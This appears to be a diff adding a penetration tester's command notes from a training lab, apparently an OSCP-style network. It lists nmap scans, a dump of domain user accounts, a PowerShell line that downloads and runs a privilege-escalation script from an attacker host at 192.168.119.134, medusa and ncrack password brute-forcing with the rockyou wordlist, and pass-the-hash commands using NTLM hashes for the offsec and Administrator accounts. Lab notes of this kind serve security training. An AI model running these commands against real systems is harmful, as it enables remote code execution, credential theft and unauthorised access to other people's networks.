@@ -1,0 +1,29 @@
+nmap -sV -sC -Pn 10.11.1.22 > nmap.txt
+nmap -p-  10.11.1.22 > nmapall.txt
+
+
+C:\Users\alice>net user /domain
+The request will be processed at a domain controller for domain svcorp.com.
+
+
+User accounts for \\sv-dc01.svcorp.com
+
+-------------------------------------------------------------------------------
+adam                     Administrator            alice
+bethany                  bob                      brett
+bruce                    carol                    cory
+evan                     extmailservice           Guest
+HP3service               james                    jeff
+joe                      john                     kevin
+krbtgt                   mike                     nicky
+nina                     pedro                    pete
+ralph                    sherlock                 sqlServer
+tris
+The command completed successfully.
+
+
+IEX(New-Object Net.Webclient).downloadstring('http://192.168.119.134/Sherlock.ps1')
+medusa -h 10.11.1.22 -u tris -P /usr/share/wordlists/rockyou.txt -M http-m DIR:/admin
+ncrack -u adam -P /usr/share/wordlists/rockyou.txt -p 3389 10.11.1.22
+pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.1.20 cmd
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.0.22 cmd
